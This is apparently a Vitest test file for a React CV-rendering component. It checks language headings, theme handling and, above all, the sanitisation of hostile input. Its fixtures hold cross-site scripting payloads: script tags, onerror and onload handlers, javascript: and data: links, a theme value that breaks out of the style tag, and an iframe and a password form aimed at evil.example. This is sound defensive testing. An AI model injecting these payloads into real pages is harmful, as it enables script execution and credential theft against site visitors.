import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { initialCVData, type CVData } from '../../../types/cv';
import PublicCvSheet from '../PublicCvSheet';

const html = (content: unknown, language = 'EN', theme = 'modern') =>
  renderToStaticMarkup(<PublicCvSheet content={content} language={language} theme={theme} />);

/** The CV part of the output, without the theme's stylesheet. */
const sheet = (content: unknown) => html(content).split('</style>').slice(1).join('</style>');

describe('PublicCvSheet', () => {
  it('renders a normal CV with everything the generator produces', () => {
    const out = sheet(initialCVData);

    expect(out).toContain('<h1>John Doe</h1>');
    expect(out).toContain('<div class="cv-role">Software Engineer</div>');
    expect(out).toContain('<table>');
    expect(out).toContain('<strong>Tech Company Inc.</strong>');
    expect(out).toContain('Professional Experience');
    expect(out).toMatch(/<li>Led the migration/);
    expect(out).toContain(
      '<a href="https://github.com/johndoe" target="_blank" rel="nofollow ugc noopener noreferrer">'
    );
  });

  it('uses the CV language for headings and falls back for unknown values', () => {
    expect(html(initialCVData, 'ES')).toContain('Experiencia Profesional');
    expect(html(initialCVData, 'PT')).toContain('Experiência Profissional');
    expect(html(initialCVData, 'klingon')).toContain('Experiencia Profesional');
  });

  it('takes the stylesheet from our own themes, never from the stored value', () => {
    // (Stylesheet contents are checked in the browser tests; here they load empty)
    expect(html(initialCVData, 'EN', 'minimal')).toMatch(/^<style>/);
    const forged = html(initialCVData, 'EN', '</style><script>alert(1)</script>');
    expect(forged).not.toContain('alert(1)');
    expect(forged).toMatch(/^<style>[^<]*<\/style><div class="cv-preview-content/);
  });

  it('survives an empty or broken CV', () => {
    for (const content of [null, undefined, 'text', 42, {}, { personal: null }]) {
      expect(() => html(content)).not.toThrow();
    }
  });

  it('removes everything that could run or load something', () => {
    const hostile: CVData = {
      ...initialCVData,
      personal: {
        ...initialCVData.personal,
        name: 'Mallory<script>window.__pwned = 1</script>',
        role: 'Dev<img src=x onerror="window.__pwned = 1">',
        summary:
          'Hello <iframe src="https://evil.example"></iframe><style>body{display:none}</style>' +
          '<a href="javascript:window.__pwned=1" onclick="steal()">click</a> ' +
          '<form action="https://evil.example"><input name="password"></form> ' +
          '<svg onload="steal()"><circle/></svg> <object data="x"></object> ' +
          '<div style="position:fixed" class="overlay" id="root">overlay</div>',
        socials: [
          { id: '1', network: 'Site', username: 'x', url: 'javascript:alert(1)' },
          { id: '2', network: 'Data', username: 'x', url: 'data:text/html,<script>1</script>' },
          { id: '3', network: 'Real', username: 'x', url: 'https://example.com/me' },
        ],
      },
      experience: [
        {
          ...initialCVData.experience[0],
          company: 'Evil <b onmouseover="steal()">Corp</b>',
          description: ['<img src="https://tracker.example/pixel.gif">', 'Normal bullet'],
        },
      ],
    };

    const out = sheet(hostile);

    expect(out).not.toMatch(/<(script|img|iframe|style|form|input|svg|object|embed)\b/i);
    expect(out).not.toMatch(/\son[a-z]+\s*=/i);
    expect(out).not.toMatch(/javascript:|data:text/i);
    expect(out).not.toContain('__pwned');
    expect(out).not.toMatch(/style=|class="overlay"|id="root"/);
    expect(out).not.toContain('tracker.example');
    // The harmless parts are still there
    expect(out).toContain('Mallory');
    expect(out).toContain('<b>Corp</b>');
    expect(out).toContain('Normal bullet');
    expect(out).toContain('href="https://example.com/me"');
  });

  it('applies the same rules to a CV written by hand in Markdown', () => {
    const out = sheet({
      mode: 'markdown',
      markdown:
        '# Ada\n\n[safe](https://example.com) [bad](javascript:alert(1))\n\n' +
        '<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n**bold**',
    });

    expect(out).toContain('<h1>Ada</h1>');
    expect(out).toContain('<strong>bold</strong>');
    expect(out).toContain('href="https://example.com"');
    expect(out).not.toMatch(/<script|<img|alert\(1\)|javascript:/i);
  });
});
